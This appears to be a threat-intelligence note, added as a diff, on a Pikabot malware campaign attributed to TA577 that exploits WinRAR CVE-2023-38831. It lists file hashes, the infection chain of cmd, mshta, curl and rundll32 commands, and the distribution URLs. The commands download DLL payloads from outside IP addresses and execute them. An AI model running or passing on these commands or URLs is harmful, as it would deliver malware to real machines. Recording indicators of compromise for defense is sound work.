@@ -1,0 +1,51 @@
+07.11.2023 | Pikabot | TA577 | CVE-2023-38831
+
+*************************************************
+
+.zip d21557c8e4ba4312fca9b3998538d46ecdb06da048e33447598d4ba5ea68f44b pw = RE
+.dll ba37935890d73a9e00e05e07dec27f0cebc74035313d81ca8adce8b225c82b3d
+
+.rar e215b91ab8e791d0a7a58a462f33a2ef36886b2b9d8bb211466172902f092796 - CVE-2023-38831
+.dll dbc9933e0f944f5a413eac3e80c51d1a83d4f5cfe12a4fb096d306ab437bfccf
+
+*************************************************
+
+rar > cmd > curl > dll
+
+winrar.exe C:\Users\Admin\AppData\Local\Temp\DOLOREl.rev
+
+cmd.exe /c "C:\Users\Admin\AppData\Local\Temp\7zO8634D388\123.pdf .cmd"
+
+mshta.exe C:\Users\Admin\AppData\Local\Temp\7zO8634D388\123.pdf .cmd
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl http://45.32.206.198/Ha5tL/0.169342545590136.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl http://45.32.223.151/qC8tr/0.047622946180716164.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl http://108.61.219.39/SVRoAEb/0.04608038392118269.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl 0.1752351157790497.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl 0.6879500835279709.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c timeout 10 & rundll32 C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX,Excpt
+
+timeout  10 
+
+rundll32  C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX,Excpt
+
+*************************************************
+
+.dll distro
+
+http://49.12.74.9/326yCW/Rumty
+http://188.34.163.57/I7P3f/circu
+
+http://45.32.206.198/Ha5tL/0.169342545590136.dat
+http://45.32.223.151/qC8tr/0.047622946180716164.dat
+http://108.61.219.39/SVRoAEb/0.04608038392118269.dat
+
+*************************************************
+
+c2'
+
